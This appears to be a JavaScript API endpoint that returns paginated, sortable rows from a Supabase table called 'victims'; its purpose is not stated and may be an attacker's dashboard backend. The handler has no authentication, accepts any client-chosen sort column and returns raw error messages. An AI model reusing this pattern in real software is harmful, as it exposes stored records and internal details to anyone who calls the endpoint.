/**
 * Victims API Endpoint
 *
 * Provides paginated list of victims
 *
 * GET /api/victims?page=1&limit=20&sort=-timestamp
 */

import { getSupabaseClient } from './_supabase.js';

/**
 * Parse sort parameter (e.g. "-timestamp" → column + ascending: false)
 */
function parseSortParam(sortParam) {
  if (!sortParam) return { column: 'timestamp', ascending: false };

  const ascending = !sortParam.startsWith('-');
  const column = sortParam.replace(/^-/, '');

  return { column, ascending };
}

/**
 * Main handler
 */
export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const supabase = getSupabaseClient();

    const page = parseInt(req.query.page) || 1;
    const limit = Math.min(parseInt(req.query.limit) || 20, 100);
    const { column, ascending } = parseSortParam(req.query.sort);
    const from = (page - 1) * limit;
    const to = from + limit - 1;

    // Fetch page + total count in one request
    const { data: victims, error, count } = await supabase
      .from('victims')
      .select('*', { count: 'exact' })
      .order(column, { ascending })
      .range(from, to);

    if (error) throw error;

    const totalRecords = count ?? 0;
    const totalPages = Math.ceil(totalRecords / limit);

    return res.status(200).json({
      victims: victims || [],
      pagination: {
        currentPage: page,
        totalPages,
        totalRecords,
        hasNext: page < totalPages,
        hasPrev: page > 1,
        perPage: limit,
      },
    });
  } catch (error) {
    console.error('Victims error:', error);
    return res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
}
